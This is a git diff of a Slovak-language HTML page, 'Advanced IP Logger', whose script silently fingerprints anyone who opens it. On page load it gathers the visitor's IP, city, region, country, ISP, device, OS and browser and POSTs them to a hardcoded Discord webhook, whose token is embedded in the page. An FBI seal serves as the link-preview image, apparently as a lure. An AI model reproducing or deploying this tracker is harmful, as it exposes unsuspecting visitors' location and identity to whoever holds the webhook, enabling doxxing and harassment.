@@ -1,41 +1,76 @@
+<!DOCTYPE html>
+<html lang="sk">
 <head>
   <meta charset="UTF-8" />
-  <title>IP Logger s webhookom</title>
-  
-  <!-- Len obrázok, bez title a description -->
+  <title>Advanced IP Logger</title>
   <meta property="og:image" content="https://kokotzkanala.github.io/TBO-2.0-Ui/FBI_logo_Seal_of_the_Federal_Bureau_of_Investigation-2264216785.png" />
   <meta property="og:url" content="https://kokotzkanala.github.io/TBO-2.0-Ui/" />
   <meta property="og:type" content="website" />
 </head>
 <body>
-  <h1>IP Logger</h1>
+  <h1>Advanced IP Logger</h1>
   <script>
     const webhookURL = "https://discord.com/api/webhooks/1403164786426122280/Qr-LlmfaJTRDq6OkG4SZ0VLAb_z0SEZKtdvNaDtOwEmo_u7wkalQjiwdJTNSLnxtTR5z";
 
-    fetch('https://api.ipify.org?format=json')
+    // Funkcia na detekciu zariadenia a prehliadača z User-Agent
+    function getDeviceInfo() {
+      const ua = navigator.userAgent;
+      let device = "Neznáme zariadenie";
+      let os = "Neznámy OS";
+      let browser = "Neznámy prehliadač";
+
+      // Detekcia OS
+      if (ua.indexOf("Windows NT 10.0") !== -1) os = "Windows 10";
+      else if (ua.indexOf("Windows NT 6.3") !== -1) os = "Windows 8.1";
+      else if (ua.indexOf("Windows NT 6.2") !== -1) os = "Windows 8";
+      else if (ua.indexOf("Windows NT 6.1") !== -1) os = "Windows 7";
+      else if (ua.indexOf("Mac OS X") !== -1) os = "Mac OS X";
+      else if (ua.indexOf("Android") !== -1) os = "Android";
+      else if (ua.indexOf("iPhone") !== -1 || ua.indexOf("iPad") !== -1) os = "iOS";
+
+      // Detekcia zariadenia
+      if (/Mobi|Android/i.test(ua)) device = "Mobilné zariadenie";
+      else device = "Desktop";
+
+      // Detekcia prehliadača
+      if (ua.indexOf("Chrome") !== -1 && ua.indexOf("Edge") === -1) browser = "Chrome";
+      else if (ua.indexOf("Firefox") !== -1) browser = "Firefox";
+      else if (ua.indexOf("Safari") !== -1 && ua.indexOf("Chrome") === -1) browser = "Safari";
+      else if (ua.indexOf("Edge") !== -1) browser = "Edge";
+      else if (ua.indexOf("OPR") !== -1) browser = "Opera";
+
+      return { device, os, browser };
+    }
+
+    // Najprv získame info o IP + lokalite cez ipapi.co
+    fetch('https://ipapi.co/json/')
       .then(res => res.json())
-      .then(data => {
-        const ip = data.ip;
-        console.log("IP návštevníka:", ip);
+      .then(ipData => {
+        const { ip, city, region, country_name, org } = ipData;
+        const { device, os, browser } = getDeviceInfo();
+
+        const message = `
+**Nový návštevník!**
+IP: ${ip}
+Krajina: ${country_name} (${region}, ${city})
+Poskytovateľ: ${org}
+Zariadenie: ${device}
+Operačný systém: ${os}
+Prehliadač: ${browser}
+        `;
 
         fetch(webhookURL, {
           method: 'POST',
-          headers: {
-            'Content-Type': 'application/json',
-          },
-          body: JSON.stringify({
-            content: `Nový návštevník so záznamom IP: ${ip}`
-          }),
+          headers: { 'Content-Type': 'application/json' },
+          body: JSON.stringify({ content: message }),
         })
         .then(response => {
-          if (response.ok) {
-            console.log("IP poslaná na webhook");
-          } else {
-            console.error("Chyba pri posielaní na webhook");
-          }
+          if (response.ok) console.log("Rozšírený log úspešne odoslaný");
+          else console.error("Chyba pri odosielaní rozšíreného logu");
         })
         .catch(console.error);
       })
       .catch(console.error);
   </script>
 </body>
+</html>
